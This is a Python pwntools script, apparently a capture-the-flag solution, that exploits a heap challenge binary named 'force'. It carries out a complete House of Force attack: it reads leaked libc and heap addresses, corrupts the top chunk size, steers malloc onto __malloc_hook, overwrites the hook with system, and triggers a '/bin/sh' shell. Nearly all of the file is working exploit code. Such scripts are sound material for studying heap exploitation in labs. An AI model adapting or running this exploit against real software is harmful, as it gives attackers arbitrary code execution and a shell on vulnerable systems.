#!/usr/bin/env python3
from pwn import *
import monkeyhex
import time
import argparse
import re
from functools import partial
import logging
import ctypes
import struct

# Run with ipython3 -i solve.py -- DEBUG <one_gadget>

parser = argparse.ArgumentParser()
parser.add_argument("one_gadget", type=partial(int, base=0), nargs=argparse.REMAINDER)
argparse_args = parser.parse_args()

# context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

# default libc path for some dists is /usr/lib/libc.so.6
# lib = ELF('/lib/x86_64-linux-gnu/libc.so.6') if not args.REMOTE else ELF('libc.so.6')
# lib.sym['binsh'] = lib.offset_to_vaddr(lib.data.find(b'/bin/sh'))
# lib.sym['one_gadget'] = argparse_args.one_gadget[0] if argparse_args.one_gadget else 0
binary = context.binary = ELF('force')
lib = ELF('.glibc/glibc_2.28_no-tcache/libc.so.6')

def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """
    c
    """ if commands is None else commands
    res = gdb.attach(p, val)
    pause()
    return res


def new_proc(start_gdb=False, val=None):
    """Start a new process with predefined debug operations"""
    env = dict()
    # env['LD_LIBRARY_PATH'] = os.getcwd()
    # patchelf --set-interpreter "$(ls ld-*.so)" force
    # ln -s libc-*.so libc.so.6
    p = process(binary.path, env=env)
    if start_gdb is True:
        attach_gdb(p, val)
    return p

def bnot(n, numbits=context.bits):
    return (1 << numbits) -1 -n

def align(val, align_to):
    return val & bnot(align_to - 1)

def batch(it, sz):
    length = len(it)
    for i in range(0, length, sz):
        yield it[i:i+sz]

p = new_proc(context.log_level == logging.DEBUG) if not args.REMOTE else remote('localhost', 8000)
# do leak / payload gen here

payload = b''

recvd = p.recvuntil(b'Surrender')
[system_addr, heap_base] = [int(i, 0) for i in re.findall(b'0x[a-f0-9]+', recvd)]
lib.address = system_addr - lib.sym['system']

first_chunk_size = 256
first_chunk_addr = heap_base + 0x10
p.sendline(b'1')
p.sendlineafter(b's?: ', str(first_chunk_size).encode())
# first chunk size is already the usable size
ptr_top = first_chunk_addr + first_chunk_size

neg1 = ctypes.c_int64(-1)
init_payload = b'/bin/sh\x00'.ljust(first_chunk_size+8, b'A')
init_payload += struct.pack(neg1._type_, neg1.value)
# overwrite top chunk size
p.sendlineafter(b'l?: ', init_payload)


# make malloc calculate the address of the next chunk incorrectly
# and set the address to __malloc_hook
p.sendlineafter(b'Surrender', b'1')
malsize = lib.sym['__malloc_hook'] - (context.bytes*4) - ptr_top
p.sendlineafter(b's?: ', str(malsize).encode())
p.sendlineafter(b'l?: ', b'B')

# write address of system into __malloc_hook
p.sendlineafter(b'Surrender', b'1')
p.sendlineafter(b's?: ', str(context.bytes).encode())
p.sendafter(b'l?: ', p64(system_addr))

# call malloc (and __malloc_hook) with a size that doesn't make sense,
# but that is also the address of /bin/sh
p.sendlineafter(b'Surrender', b'1')
p.sendlineafter(b's?: ', str(first_chunk_addr).encode())
p.interactive()

